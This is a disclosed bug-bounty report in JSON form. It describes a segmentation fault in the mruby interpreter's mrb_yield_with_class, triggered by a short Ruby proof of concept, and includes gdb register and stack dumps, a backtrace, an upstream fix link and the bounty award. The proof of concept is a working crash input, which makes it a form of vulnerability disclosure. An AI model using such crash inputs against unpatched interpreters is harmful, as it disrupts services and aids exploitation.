{"id":212074,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTIwNzQ=","url":"https://hackerone.com/reports/212074","title":"SIGSEGV - mrb_yield_with_class","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-03-09T20:39:57.968Z","submitted_at":"2017-03-09T20:39:57.968Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"icanthack","url":"/icanthack","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/VZT6z9VkSXerNiDeTxWymrSK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-04-13T21:11:01.874Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-03-14T21:11:01.715Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Linux Ubuntu Xenial X64\ncommit 63dbed00946afda34178a479cfa38fa78d620a00\nAuthor: Yukihiro \"Matz\" Matsumoto \u003cmatz@ruby-lang.org\u003e\nDate:   Tue Mar 7 15:01:09 2017 +0900\n\n\nPoC\n```\ndef a\ninstance_exec (){return}\na()ensure\nend\na\n```\n\noutput\n```\n [----------------------------------registers-----------------------------------]\nRAX: 0x7ffff7fec7d0\nRBX: 0x7ffff7fec7e0\nRCX: 0x7ffff7fca800 --\u003e 0x0\nRDX: 0x7ffff7fec7e0\nRSI: 0x7ffff7fec7d0\nRDI: 0x7ffff7fca800 --\u003e 0x0\nRBP: 0x7fffffffd780 --\u003e 0x7fffffffd800 --\u003e 0x7fffffffd880 --\u003e 0x7fffffffdf00 --\u003e 0x7fffffffdf50 --\u003e 0x7fffffffdfb0 (--\u003e ...)\nRSP: 0x7fffffffd780 --\u003e 0x7fffffffd800 --\u003e 0x7fffffffd880 --\u003e 0x7fffffffdf00 --\u003e 0x7fffffffdf50 --\u003e 0x7fffffffdfb0 (--\u003e ...)\nRIP: 0x41ecc8 (\u003cstack_copy+42\u003e:\tmov    rdx,QWORD PTR [rax+0x8])\nR8 : 0x7ffff7fec7d0\nR9 : 0x6b8750 --\u003e 0xc ('\\x0c')\nR10: 0x1\nR11: 0x246\nR12: 0x401990 (\u003c_start\u003e:\txor    ebp,ebp)\nR13: 0x7fffffffe310 --\u003e 0x2\nR14: 0x0\nR15: 0x0\nEFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x41ecbc \u003cstack_copy+30\u003e:\tmov    rax,QWORD PTR [rbp-0x10]\n   0x41ecc0 \u003cstack_copy+34\u003e:\tlea    rdx,[rax+0x10]\n   0x41ecc4 \u003cstack_copy+38\u003e:\tmov    QWORD PTR [rbp-0x10],rdx\n=\u003e 0x41ecc8 \u003cstack_copy+42\u003e:\tmov    rdx,QWORD PTR [rax+0x8]\n   0x41eccc \u003cstack_copy+46\u003e:\tmov    rax,QWORD PTR [rax]\n   0x41eccf \u003cstack_copy+49\u003e:\tmov    QWORD PTR [rcx],rax\n   0x41ecd2 \u003cstack_copy+52\u003e:\tmov    QWORD PTR [rcx+0x8],rdx\n   0x41ecd6 \u003cstack_copy+56\u003e:\tmov    rax,QWORD PTR [rbp-0x18]\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffd780 --\u003e 0x7fffffffd800 --\u003e 0x7fffffffd880 --\u003e 0x7fffffffdf00 --\u003e 0x7fffffffdf50 --\u003e 0x7fffffffdfb0 (--\u003e ...)\n0008| 0x7fffffffd788 --\u003e 0x420b4c (\u003cmrb_yield_with_class+443\u003e:\tmov    rax,QWORD PTR [rbp-0x48])\n0016| 0x7fffffffd790 --\u003e 0x6b8750 --\u003e 0xc ('\\x0c')\n0024| 0x7fffffffd798 --\u003e 0x7ffff7fec7d0\n0032| 0x7fffffffd7a0 --\u003e 0x747d10 --\u003e 0x20d\n0040| 0x7fffffffd7a8 --\u003e 0xd ('\\r')\n0048| 0x7fffffffd7b0 --\u003e 0x1ffffd810\n0056| 0x7fffffffd7b8 --\u003e 0x6b1010 --\u003e 0x7fffffffde10 --\u003e 0x0\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x000000000041ecc8 in stack_copy (dst=0x7ffff7fca810, src=0x7ffff7fec7e0, size=0x0) at /home/vagrant/mruby/src/vm.c:87\n87\t    *dst++ = *src++;\n```\n\nbt\n```\n#0  0x000000000041ecc8 in stack_copy (dst=0x7ffff7fca810, src=0x7ffff7fec7e0, size=0x0) at /home/vagrant/mruby/src/vm.c:87\n#1  0x0000000000420b4c in mrb_yield_with_class (mrb=0x6b1010, b=..., argc=0x1, argv=0x7ffff7fec7d0, self=..., c=0x6b8750) at /home/vagrant/mruby/src/vm.c:693\n#2  0x000000000046aaf8 in mrb_obj_instance_exec (mrb=0x6b1010, self=...) at /home/vagrant/mruby/mrbgems/mruby-object-ext/src/object.c:87\n#3  0x0000000000422bb4 in mrb_vm_exec (mrb=0x6b1010, proc=0x6b3ef0, pc=0x7208b0) at /home/vagrant/mruby/src/vm.c:1229\n#4  0x0000000000421088 in mrb_vm_run (mrb=0x6b1010, proc=0x6b3f20, self=..., stack_keep=0x0) at /home/vagrant/mruby/src/vm.c:822\n#5  0x0000000000429367 in mrb_top_run (mrb=0x6b1010, proc=0x6b3f20, self=..., stack_keep=0x0) at /home/vagrant/mruby/src/vm.c:2581\n#6  0x00000000004497dd in mrb_load_exec (mrb=0x6b1010, p=0x70d970, c=0x70c5d0) at /home/vagrant/mruby/mrbgems/mruby-compiler/core/parse.y:5759\n#7  0x0000000000449873 in mrb_load_file_cxt (mrb=0x6b1010, f=0x70d5c0, c=0x70c5d0) at /home/vagrant/mruby/mrbgems/mruby-compiler/core/parse.y:5768\n#8  0x00000000004022f0 in main (argc=0x2, argv=0x7fffffffe318) at /home/vagrant/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227\n#9  0x00007ffff7725830 in __libc_start_main (main=0x401fd6 \u003cmain\u003e, argc=0x2, argv=0x7fffffffe318, init=\u003coptimized out\u003e, fini=\u003coptimized out\u003e,\n    rtld_fini=\u003coptimized out\u003e, stack_end=0x7fffffffe308) at ../csu/libc-start.c:291\n#10 0x00000000004019b9 in _start ()\n```","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-04-13T21:11:01.753Z","allow_singular_disclosure_after":-141843198.0588773,"singular_disclosure_allowed":true,"vote_count":4,"voters":["ali","icanthack","eveeez","spetr0x"],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1530898,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","automated_response":true,"created_at":"2017-03-09T20:39:58.157Z","updated_at":"2017-03-09T20:39:58.157Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1530901,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Reported as Design Issue! Wrong click! sorry!","automated_response":false,"created_at":"2017-03-09T20:40:47.008Z","updated_at":"2017-03-09T20:40:47.008Z","actor":{"username":"icanthack","cleared":true,"url":"/icanthack","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/VZT6z9VkSXerNiDeTxWymrSK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1533290,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the crash and opened an issue upstream: https://github.com/mruby/mruby/issues/3500","automated_response":false,"created_at":"2017-03-10T20:19:24.875Z","updated_at":"2017-03-10T20:19:24.875Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1538883,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"fixed in https://github.com/mruby/mruby/commit/191ee2596cc7b22e3213d82bab1a48ae6152b475","automated_response":false,"created_at":"2017-03-13T22:17:57.829Z","updated_at":"2017-03-13T22:17:57.829Z","actor":{"username":"icanthack","cleared":true,"url":"/icanthack","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/VZT6z9VkSXerNiDeTxWymrSK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1540213,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for your report.\n\nAs you noted, this issue was addressed upstream in https://github.com/mruby/mruby/commit/191ee2596cc7b22e3213d82bab1a48ae6152b475\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","automated_response":false,"created_at":"2017-03-14T14:32:24.416Z","updated_at":"2017-03-14T14:32:24.416Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"icanthack","url":"/icanthack"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541588,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify and the MRuby project!","automated_response":false,"created_at":"2017-03-14T21:10:55.247Z","updated_at":"2017-03-14T21:10:55.247Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"icanthack","url":"/icanthack"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541589,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-03-14T21:11:01.735Z","updated_at":"2017-03-14T21:11:01.735Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1610573,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-04-13T21:11:01.893Z","updated_at":"2017-04-13T21:11:01.893Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}